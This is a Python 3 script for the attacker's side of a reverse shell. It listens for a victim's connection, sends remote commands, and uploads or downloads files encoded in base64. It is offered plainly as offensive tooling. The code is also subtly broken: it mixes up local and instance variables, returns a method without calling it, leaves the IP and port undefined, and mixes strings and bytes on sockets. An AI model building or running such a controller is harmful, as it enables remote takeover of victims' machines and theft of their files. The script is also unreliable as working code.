#!/usr/bin/python3

import socket, json, base64, sys

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection..")
        self.connection, address = self.listener.accept()
        print("[+] Got a connection from " + str(address))

    def send_data(self, command):
        json_data = json.dumps(command)
        self.connection.send(json_data)

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self, command):
        self.send_data(command)
        if command[0] == "exit":
            self.connection.close()
            print("[+] Exiting program...")
            sys.exit()
        return self.receive_data

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successfully completed."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload" and len(command) > 1:
                    content = self.read_file(command[1])
                    command.append(content)
                command_result = self.execute_remotely(command)
                if command[0] == "download" and len(command) > 1 and "[-] Error" not in command_result:
                    command_result = self.write_file(command[1], command_result)
            except Exception:
                command_result = "[-] Error during command execution"
            print(command_result)

my_listener = Listener(ip, port)
my_listener.run()
